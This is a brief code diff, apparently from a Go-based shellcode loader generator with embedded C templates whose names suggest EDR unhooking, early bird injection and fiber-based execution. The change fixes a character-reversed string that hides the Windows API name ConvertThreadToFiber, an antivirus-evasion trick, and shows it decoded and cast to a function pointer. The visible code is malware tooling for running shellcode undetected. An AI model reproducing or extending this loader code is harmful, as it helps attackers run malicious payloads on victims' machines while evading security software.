@@ -267,7 +267,7 @@ var __c__unhook__earlyBird = `
 // 纤程加载
 var __c__unhook__fiber = `
 	
-	char convert_thread_to_fiber[] = {  'r', 'e', 'b', 'i', 'F', 'o', 'T', 'd', 'a', 'e', 'r', 'T', 't', 'r', 'e', 'v', 'n', 'o', 'C', '\0' };
+    char convert_thread_to_fiber[] = {  'r', 'e', 'b', 'i', 'F', 'o', 'T', 'd', 'a', 'e', 'r', 'h','T', 't', 'r', 'e', 'v', 'n', 'o', 'C', '\0' };
     reverseString(convert_thread_to_fiber);
     typedef LPVOID(WINAPI* pConvertThreadToFiber)(
             LPVOID lpParameter
